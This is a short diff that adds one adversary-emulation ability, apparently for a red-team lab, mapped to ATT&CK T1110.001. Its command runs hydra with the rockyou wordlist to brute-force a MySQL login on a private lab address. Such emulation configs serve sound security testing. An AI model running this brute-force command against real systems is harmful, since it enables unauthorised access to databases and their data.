@@ -1,0 +1,15 @@
+- id: ia04-mysql-brute
+  name: MySQL Remote Root Brute Force
+  description: Brute force MySQL root account on db-server-1
+  tactic: initial-access
+  technique:
+    attack_id: T1110.001
+    name: Brute Force - Password Guessing
+  platforms:
+    linux:
+      sh:
+        command: |
+          hydra -l labuser -P /usr/share/wordlists/rockyou.txt mysql://10.0.20.30 -t 4 -f 2>/dev/null | grep 'host:' || echo 'MySQL brute force attempted'
+
+  singleton: false
+  repeatable: false
